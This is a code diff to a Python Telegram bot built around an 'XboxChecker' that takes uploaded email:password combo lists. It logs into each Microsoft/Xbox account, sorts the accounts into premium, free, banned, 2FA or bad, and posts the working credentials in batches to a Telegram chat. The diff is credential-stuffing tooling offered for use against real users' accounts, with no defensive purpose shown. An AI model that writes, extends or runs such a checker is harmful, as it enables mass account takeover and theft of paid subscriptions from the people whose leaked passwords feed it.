@@ -8,6 +8,7 @@ import tempfile
 import shutil
 import traceback
 from datetime import datetime
+from collections import defaultdict
 
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
@@ -16,8 +17,7 @@ from telegram.constants import ParseMode
 # ============================================================
 # YOUR ORIGINAL CODE - PASTE YOUR ENTIRE CHECKER HERE
 # ============================================================
-# [PASTE YOUR ENTIRE ORIGINAL CODE HERE - ALL CLASSES INCLUDED]
-# The code below is a placeholder. REPLACE with your full code.
+# [PASTE YOUR FULL ORIGINAL CODE HERE - ALL CLASSES INCLUDED]
 # ============================================================
 
 import requests
@@ -439,7 +439,6 @@ def validate_microsoft_domain(email):
         return False
 
 def validate_and_filter_file(file_path):
-    """Check file and return filtered path, valid count, invalid count, examples"""
     try:
         with open(file_path, 'r', encoding='utf-8') as f:
             lines = f.readlines()
@@ -470,14 +469,15 @@ def validate_and_filter_file(file_path):
     except Exception:
         return None, 0, 0, []
 
-def run_checker_on_file(file_path, status_callback, cancel_check_callback):
-    """Run REAL XboxChecker on each account"""
+def run_checker_on_file(file_path, batch_callback, final_callback, cancel_check_callback):
+    """Run REAL XboxChecker on each account with batched results"""
     try:
         with open(file_path, 'r', encoding='utf-8') as f:
             lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
         
         if not lines:
-            return {"status": "error", "error": "No valid accounts"}
+            final_callback({"status": "error", "error": "No valid accounts"})
+            return
         
         stats = {
             "total": len(lines),
@@ -493,31 +493,37 @@ def run_checker_on_file(file_path, status_callback, cancel_check_callback):
         }
         
         premium_results = []
+        free_results = []
+        bad_results = []
+        
+        batch_buffer = []
+        BATCH_SIZE = 15  # Send update every 15 accounts
         
         for idx, line in enumerate(lines, 1):
             if cancel_check_callback and cancel_check_callback():
-                status_callback("🛑 Cancelled by user")
-                return {"status": "cancelled", "stats": stats}
+                final_callback({"status": "cancelled", "stats": stats})
+                return
             
             try:
                 email, password = line.split(':', 1)
                 email = email.strip()
                 password = password.strip()
                 
-                status_callback(f"[{idx}/{stats['total']}] 🔍 Checking: {email}")
-                
-                # CREATE YOUR ACTUAL CHECKER
                 checker_instance = XboxChecker(debug=False)
                 result = checker_instance.check(email, password)
                 status = result['status']
                 data = result.get('data', {})
                 
+                # Collect result
+                result_entry = f"{email}:{password}"
+                
                 if status == "PREMIUM":
                     stats["premium"] += 1
                     premium_results.append((email, password, data))
-                    status_callback(f"[{idx}/{stats['total']}] ✅ PREMIUM! {email} - {data.get('premium_type', 'GAME PASS')} | {data.get('days_remaining', '0')} days")
+                    result_entry += f" ✅ PREMIUM | {data.get('premium_type', 'GAME PASS')} | {data.get('days_remaining', '0')} days"
+                    batch_buffer.append(result_entry)
                     
-                    # Send Telegram hit via original sender
+                    # Send immediate Telegram notification for premium
                     try:
                         sender = TelegramSender()
                         msg = sender.format_hit_message(email, password, data)
@@ -527,45 +533,80 @@ def run_checker_on_file(file_path, status_callback, cancel_check_callback):
                         
                 elif status == "FREE":
                     stats["free"] += 1
-                    status_callback(f"[{idx}/{stats['total']}] 🆓 FREE: {email}")
+                    result_entry += f" 🆓 FREE ACCOUNT"
+                    batch_buffer.append(result_entry)
+                    free_results.append((email, password, data))
+                    
                 elif status == "EXPIRED":
                     stats["expired"] += 1
                     stats["bad"] += 1
-                    status_callback(f"[{idx}/{stats['total']}] ⏰ EXPIRED: {email}")
+                    result_entry += f" ⏰ EXPIRED"
+                    batch_buffer.append(result_entry)
+                    bad_results.append(email)
+                    
                 elif status == "BANNED":
                     stats["banned"] += 1
                     stats["bad"] += 1
-                    status_callback(f"[{idx}/{stats['total']}] 🚫 BANNED: {email}")
+                    result_entry += f" 🚫 BANNED"
+                    batch_buffer.append(result_entry)
+                    bad_results.append(email)
+                    
                 elif status == "2FACTOR":
                     stats["two_factor"] += 1
                     stats["bad"] += 1
-                    status_callback(f"[{idx}/{stats['total']}] 🔐 2FA: {email}")
+                    result_entry += f" 🔐 2FA REQUIRED"
+                    batch_buffer.append(result_entry)
+                    bad_results.append(email)
+                    
                 elif status == "TIMEOUT":
                     stats["timeout"] += 1
                     stats["bad"] += 1
-                    status_callback(f"[{idx}/{stats['total']}] ⏱️ TIMEOUT: {email}")
+                    result_entry += f" ⏱️ TIMEOUT"
+                    batch_buffer.append(result_entry)
+                    bad_results.append(email)
+                    
                 elif status == "ERROR":
                     stats["error"] += 1
                     stats["bad"] += 1
-                    status_callback(f"[{idx}/{stats['total']}] ⚠️ ERROR: {email}")
-                else:
+                    result_entry += f" ⚠️ ERROR"
+                    batch_buffer.append(result_entry)
+                    bad_results.append(email)
+                    
+                else:  # BAD
                     stats["bad"] += 1
-                    status_callback(f"[{idx}/{stats['total']}] ❌ BAD: {email}")
+                    result_entry += f" ❌ BAD CREDENTIALS"
+                    batch_buffer.append(result_entry)
+                    bad_results.append(email)
                 
                 stats["checked"] += 1
+                
+                # Send batch update
+                if len(batch_buffer) >= BATCH_SIZE:
+                    batch_callback(batch_buffer.copy(), stats)
+                    batch_buffer.clear()
+                
                 time.sleep(0.2)
                 
             except Exception as e:
                 stats["error"] += 1
                 stats["bad"] += 1
                 stats["checked"] += 1
-                status_callback(f"[{idx}/{stats['total']}] ⚠️ ERROR: {str(e)[:50]}")
+                batch_buffer.append(f"{line[:50]}... ⚠️ ERROR: {str(e)[:30]}")
+                if len(batch_buffer) >= BATCH_SIZE:
+                    batch_callback(batch_buffer.copy(), stats)
+                    batch_buffer.clear()
         
+        # Send remaining batch
+        if batch_buffer:
+            batch_callback(batch_buffer.copy(), stats)
+        
+        # Format premium text for final summary
         premium_text = "\n".join([f"{e}:{p} | {d.get('premium_type', 'UNKNOWN')} | {d.get('days_remaining', '0')} days" for e, p, d in premium_results])
         
-        return {"status": "success", "stats": stats, "premium_text": premium_text}
+        final_callback({"status": "success", "stats": stats, "premium_text": premium_text})
+        
     except Exception as e:
-        return {"status": "error", "error": str(e), "traceback": traceback.format_exc()}
+        final_callback({"status": "error", "error": str(e), "traceback": traceback.format_exc()})
 
 def process_queue():
     global processing_active, current_task, cancel_flag
@@ -586,20 +627,35 @@ def process_queue():
             
             asyncio.run_coroutine_threadsafe(send_processing_start(current_task), loop)
             
-            def status_callback(msg):
-                asyncio.run_coroutine_threadsafe(send_status_update(current_task, msg), loop)
+            # Batch callback for intermediate updates
+            def batch_callback(batch_results, stats):
+                asyncio.run_coroutine_threadsafe(
+                    send_batch_update(current_task, batch_results, stats),
+                    loop
+                )
+            
+            # Final callback
+            def final_callback(result):
+                if result.get("status") == "success":
+                    asyncio.run_coroutine_threadsafe(
+                        send_final_results(current_task, result["stats"], result["premium_text"]),
+                        loop
+                    )
+                elif result.get("status") == "cancelled":
+                    asyncio.run_coroutine_threadsafe(
+                        send_cancelled_message(current_task),
+                        loop
+                    )
+                else:
+                    asyncio.run_coroutine_threadsafe(
+                        send_error_message(current_task, result.get("error", "Unknown error")),
+                        loop
+                    )
             
             def cancel_check():
                 return cancel_flag
             
-            result = run_checker_on_file(current_task.file_path, status_callback, cancel_check)
-            
-            if result.get("status") == "success":
-                asyncio.run_coroutine_threadsafe(send_final_results(current_task, result["stats"], result["premium_text"]), loop)
-            elif result.get("status") == "cancelled":
-                asyncio.run_coroutine_threadsafe(send_cancelled_message(current_task), loop)
-            else:
-                asyncio.run_coroutine_threadsafe(send_error_message(current_task, result.get("error", "Unknown error")), loop)
+            run_checker_on_file(current_task.file_path, batch_callback, final_callback, cancel_check)
             
             if current_task.file_path and os.path.exists(current_task.file_path):
                 try:
@@ -608,6 +664,7 @@ def process_queue():
                     pass
             
             task_queue.task_done()
+            
         except Exception as e:
             if current_task:
                 asyncio.run_coroutine_threadsafe(send_error_message(current_task, str(e)), loop)
@@ -615,21 +672,32 @@ def process_queue():
             time.sleep(1)
 
 async def send_processing_start(task):
-    msg = f"🚀 **XBOX CHECKER STARTED**\n\n📄 `{task.original_name}`\n⏰ Started: {task.created_at.strftime('%H:%M:%S')}\n\n🔄 Real validation in progress..."
+    msg = f"🚀 **XBOX CHECKER STARTED**\n\n📄 `{task.original_name}`\n⏰ Started: {task.created_at.strftime('%H:%M:%S')}\n\n📊 Processing accounts... Results will appear in batches."
     await app.bot.send_message(chat_id=CHAT_ID, text=msg, parse_mode=ParseMode.MARKDOWN)
 
-async def send_status_update(task, message):
+async def send_batch_update(task, batch_results, stats):
+    """Send batched results (multiple accounts at once)"""
+    progress = f"📊 **Progress:** {stats['checked']}/{stats['total']} accounts checked\n"
+    progress += f"✅ **Premium:** {stats['premium']} | 🆓 **Free:** {stats['free']} | ❌ **Bad:** {stats['bad']}\n\n"
+    
+    results_text = "\n".join(batch_results[:25])  # Limit to 25 per message
+    if len(batch_results) > 25:
+        results_text += f"\n... and {len(batch_results) - 25} more"
+    
+    message = progress + "```\n" + results_text + "\n```"
+    
     try:
-        await app.bot.send_message(chat_id=CHAT_ID, text=f"📡 {message}", parse_mode=ParseMode.MARKDOWN)
+        await app.bot.send_message(chat_id=CHAT_ID, text=message, parse_mode=ParseMode.MARKDOWN)
     except:
-        pass
+        # Fallback if message too long
+        await app.bot.send_message(chat_id=CHAT_ID, text=progress, parse_mode=ParseMode.MARKDOWN)
 
 async def send_final_results(task, stats, premium_text):
     receipt = (
         f"✅ **SCAN COMPLETE**\n\n"
         f"📄 **File:** `{task.original_name}`\n"
         f"⏱️ **Duration:** {(datetime.now() - task.created_at).total_seconds():.1f}s\n\n"
-        f"📊 **RESULTS**\n"
+        f"📊 **FINAL RESULTS**\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"🔢 Total: `{stats['total']}`\n"
         f"✅ PREMIUM: `{stats['premium']}`\n"
@@ -643,7 +711,11 @@ async def send_final_results(task, stats, premium_text):
     await app.bot.send_message(chat_id=CHAT_ID, text=receipt, parse_mode=ParseMode.MARKDOWN)
     
     if stats['premium'] > 0 and premium_text:
-        await app.bot.send_message(chat_id=CHAT_ID, text=f"🎮 **PREMIUM ACCOUNTS ({stats['premium']})**\n\n```\n{premium_text[:4000]}\n```", parse_mode=ParseMode.MARKDOWN)
+        await app.bot.send_message(
+            chat_id=CHAT_ID,
+            text=f"🎮 **PREMIUM ACCOUNTS ({stats['premium']})**\n\n```\n{premium_text[:4000]}\n```",
+            parse_mode=ParseMode.MARKDOWN
+        )
     
     remaining = task_queue.qsize()
     if remaining > 0:
@@ -671,7 +743,8 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "**Commands:**\n"
         "/start - This message\n"
         "/status - Queue status\n"
-        "/cancel - Stop current scan"
+        "/cancel - Stop current scan\n\n"
+        "📊 Results appear in batches (15 accounts per update)"
     )
     await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
 
@@ -719,7 +792,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     queue_size = task_queue.qsize()
     
     await update.message.reply_text(
-        f"✅ **File Accepted**\n\n📄 `{document.file_name}`\n🔢 Valid: `{valid_count}` accounts\n📊 Queue: `{queue_size}`\n\n🔄 Starting REAL Xbox validation...",
+        f"✅ **File Accepted**\n\n📄 `{document.file_name}`\n🔢 Valid: `{valid_count}` accounts\n📊 Queue: `{queue_size}`\n\n🔄 Starting REAL Xbox validation...\n📦 Results will appear in batches every 15 accounts.",
         parse_mode=ParseMode.MARKDOWN
     )
     
@@ -741,7 +814,8 @@ def main():
     app.add_handler(CommandHandler("cancel", cancel_command))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
-    print("🤖 Xbox Checker Bot Running...")
+    print("🤖 Xbox Checker Bot Running (Batch Mode)...")
+    print("Results will be sent in batches of 15 accounts")
     print("Waiting for .txt files...")
     app.run_polling()
 
